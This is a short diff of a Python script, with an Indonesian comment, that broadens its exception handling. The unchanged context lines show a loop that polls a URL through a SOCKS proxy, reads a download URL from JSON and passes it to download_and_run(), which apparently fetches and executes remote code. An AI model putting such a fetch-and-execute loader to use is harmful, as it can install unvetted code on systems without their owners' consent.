@@ -65,7 +65,7 @@ while True:
         print("socks_ip:", socks_ip)
         time.sleep(300)
         continue
-    except (requests.exceptions.RequestException, socks.SOCKS5Error, socks.ProxyConnectionError, requests.exceptions.ProxyError, socket.timeout) as e:
+    except Exception as e:
         print("Failed to connect with proxy:", str(e))
         # Mengakses URL untuk memeriksa respons JSON tanpa proxy
         try:
@@ -97,6 +97,6 @@ while True:
                 download_and_run(download_url)
                 print("success running")
                 break
-        except (requests.exceptions.RequestException, requests.exceptions.JSONDecodeError) as e:
+        except Exception as e:
             print("Failed to retrieve JSON data:", str(e))
             continue
